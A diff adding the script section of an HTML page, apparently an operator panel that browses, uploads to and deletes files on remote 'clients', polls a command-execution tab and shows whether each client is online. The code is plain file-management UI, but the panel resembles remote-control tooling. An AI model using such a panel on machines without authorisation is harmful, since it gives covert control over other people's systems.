+                document.getElementById('loadingFiles').style.display = 'none';
+                document.querySelector('.file-upload-section').style.display = 'block';
+                document.querySelector('.file-list-section').style.display = 'block';
+            }
+        }
+        
+        function formatFileSize(bytes) {
+            if (bytes === 0 || bytes === null || bytes === undefined) return '0 Bytes';
+            if (typeof bytes !== 'number') return '0 Bytes';
+            
+            const k = 1024;
+            const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            
+            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+        }
+        
+        function navigateToDirectory(path) {
+            document.getElementById('currentPath').value = path;
+            listDirectory();
+        }
+        
+        function goToParentDirectory() {
+            const currentPath = document.getElementById('currentPath').value.trim();
+            if (currentPath === '/' || currentPath === '') {
+                return; // 已经在根目录
+            }
+            
+            const pathParts = currentPath.split('/').filter(Boolean);
+            pathParts.pop(); // 移除最后一个目录
+            const parentPath = pathParts.length === 0 ? '/' : '/' + pathParts.join('/');
+            
+            document.getElementById('currentPath').value = parentPath;
+            listDirectory();
+        }
+        
+        async function deletePath(path) {
+            if (!confirm(`确定要删除 ${path} 吗？`)) {
+                return;
+            }
+            
+            try {
+                const response = await fetch(`/api/files/delete`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    credentials: 'same-origin',
+                    body: JSON.stringify({
+                        client_id: '{{ client.id }}',
+                        path: path
+                    })
+                });
+                
+                if (response.ok) {
+                    const result = await response.json();
+                    if (result.success) {
+                        alert('删除成功');
+                        listDirectory(); // 刷新文件列表
+                    } else {
+                        alert(`删除失败: ${result.message}`);
+                    }
+                } else {
+                    const errorText = await response.text();
+                    try {
+                        const error = JSON.parse(errorText);
+                        alert(`删除失败: ${error.message || 'Unknown error'}`);
+                    } catch (e) {
+                        alert(`删除失败: HTTP ${response.status}`);
+                    }
+                }
+            } catch (error) {
+                alert('删除时出错: ' + error.message);
+            }
+        }
+        
+        async function uploadFile() {
+            const fileInput = document.getElementById('fileUpload');
+            const currentPath = document.getElementById('currentPath').value.trim();
+            
+            if (!fileInput.files || fileInput.files.length === 0) {
+                alert('请选择要上传的文件');
+                return;
+            }
+            
+            const file = fileInput.files[0];
+            const targetPath = `${currentPath}/${file.name}`.replace(/\/\//g, '/');
+            
+            try {
+                const response = await fetch(`/api/files/upload/${encodeURIComponent(targetPath)}?client_id={{ client.id }}`, {
+                    method: 'POST',
+                    credentials: 'same-origin',
+                    body: file  // 直接发送文件，不用FormData
+                });
+                
+                if (response.ok) {
+                    const result = await response.json();
+                    if (result.success) {
+                        alert('文件上传成功');
+                        fileInput.value = ''; // 清空文件输入
+                        document.getElementById('fileNameDisplay').textContent = '未选择任何文件';
+                        listDirectory(); // 刷新文件列表
+                    } else {
+                        alert(`上传失败: ${result.message}`);
+                    }
+                } else {
+                    const errorText = await response.text();
+                    try {
+                        const error = JSON.parse(errorText);
+                        alert(`上传失败: ${error.message || 'Unknown error'}`);
+                    } catch (e) {
+                        alert(`上传失败: HTTP ${response.status}`);
+                    }
+                }
+            } catch (error) {
+                alert('上传时出错: ' + error.message);
+            }
+        }
+
+        // 自动刷新结果（只在命令执行标签页激活时）
+        setInterval(() => {
+            if (document.querySelector('.tab-item[data-tab="command"]').classList.contains('active')) {
+                refreshResults();
+            }
+        }, 15000);
+
+        // 动态更新客户端状态
+        function updateClientStatus() {
+            const lastSeen = new Date('{{ client.last_seen.format("%Y-%m-%dT%H:%M:%SZ") }}');
+            const now = new Date();
+            const diffInSeconds = (now - lastSeen) / 1000;
+            
+            const statusElement = document.getElementById('client-status');
+            if (diffInSeconds < 60) {
+                statusElement.innerHTML = '<span class="status online">在线</span>';
+            } else {
+                statusElement.innerHTML = '<span class="status offline">离线</span>';
+            }
+        }
+
+        // 页面加载时更新状态
+        updateClientStatus();
+
+        // 更新文件名称显示
+        function updateFileName(input) {
+            const fileNameDisplay = document.getElementById('fileNameDisplay');
+            if (input.files && input.files.length > 0) {
+                fileNameDisplay.textContent = input.files[0].name;
+            } else {
+                fileNameDisplay.textContent = '未选择任何文件';
+            }
+        }
+    </script>
+</body>
+</html>
